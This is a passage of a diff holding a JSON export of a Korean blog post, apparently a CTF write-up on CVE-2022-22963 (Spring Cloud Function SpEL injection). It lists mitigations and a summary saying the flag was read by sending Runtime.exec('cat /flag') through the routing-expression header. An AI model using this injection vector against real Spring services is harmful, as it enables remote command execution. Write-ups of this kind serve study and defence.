+            "text": "1. Spring Cloud Function 보안 업데이트\n\n2. routing-expression에 외부 입력을 직접 전달하지 않기\n\n3. 사용할 Function을 Allowlist 방식으로 제한\n\n4. SpEL에 사용자 입력이 도달하는 지점 확인\n\n5. 애플리케이션 실행 계정의 OS 권한 최소화\n\n6. 컨테이너 및 애플리케이션에서 불필요한 명령 실행 권한 제한\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "특히 단순히 Runtime, exec 같은 문자열만 차단하는 방식보다는 공격자가 SpEL 자체를 제어하지 못하도록 설계하는 것이 중요하다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "8. 3줄 요약"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "CVE-2022-22963은 Spring Cloud Function의 Routing Expression에 악성 SpEL을 전달하여 임의의 Java 코드와 시스템 명령을 실행할 수 있는 RCE 취약점이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이번 문제에서는 Spring Cloud Function 3.2.2의 spring.cloud.function.routing-expression Header에 Runtime.exec('cat /flag')를 전달해 /flag를 읽었다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Spring4Shell(CVE-2022-22965)과는 다른 취약점이며, Spring Cloud Function의 SpEL Expression Injection 취약점으로 구분해야 한다."
+          }
+        ]
+      }
+    ]
+  },
+  "source": {
+    "platform": "tistory",
+    "url": "https://yt5246.tistory.com/147",
+    "originalId": "147",
+    "publishedAt": "2026-08-27T16:11:29+09:00",
+    "updatedAt": "2026-08-27T16:11:29+09:00",
+    "importedAt": "2026-10-25T14:17:38+09:00"
+  }
+}
